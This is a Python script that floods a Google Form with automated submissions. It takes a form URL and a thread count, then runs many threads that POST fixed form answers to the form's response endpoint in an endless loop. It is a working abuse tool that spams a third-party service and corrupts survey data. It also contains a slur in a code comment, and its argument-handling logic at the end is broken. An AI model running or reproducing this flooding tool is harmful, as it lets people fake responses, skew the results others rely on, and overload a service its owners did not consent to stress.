import requests
import threading
import sys

arg = sys.argv

# thread about warning, can lag your computer
def askUrl():
    print("\n\nNOTE: This can lag your computer depending on how many threads you use\n\n")

    print("\nExample: https://docs.google.com/forms/d/e/1FAIpQLSdUgjyuJ14J6fkNFvrsY0pGdk8oYgbXI4cEYzli79t4PDnvlw/viewform\n") # example link

    # varibales

formurl = input("Enter the form url without the /viewform at the end: ").strip("/viewform") # the tip for retards

requestURL = f"{formurl}/formResponse" # the requested REST POST url
threadAmount = int(input("Amount of Threads: ")) # threads amount

# threads list to be appended to later
threads = []

# main function
def REQ():
    # While True loop so it doesnt stop unless you kill it
    while True:
        #names the request doReq to be able to get the status code and error text
        doReq = requests.post(requestURL, data={ # form data requested be the form
            "entry.2580521": "",
            "entry.1799182697.other_option_response": ".",
            "entry.1799182697": "__other_option__",
            "entry.1317977778": "No",
            "entry.1799182697_sentinel": "",
            "entry.1317977778_sentinel": "",
            "entry.1875351501_sentinel": "",
            "fvv": 1,
            "draftResponse": ["null,null,-4159324413280535833"],
            "pageHistory": 0,
            "fbzx": "-4159324413280535833"
        })

        # if the status code returns with 200 "OK" then itll tell you it passed
        if (doReq.status_code == 200):
            print(f"[+] Successfully sent to {requestURL}")
        else: # else it will not tell you and let you know it failed
            print(f"[-] Failed to send. Code: {doReq.status_code}\n[*] Error Data: {doReq.text}")
            exit()

# Threading Needed for the speed
for i in range(threadAmount):
    t = threading.Thread(target=REQ)
    t.daemon = True
    threads.append(t)

for i in range(threadAmount):
    threads[i].start()

for i in range(threadAmount):
    threads[i].join()

if (arg[1] < 3):
    REQ()
else:
    askUrl()
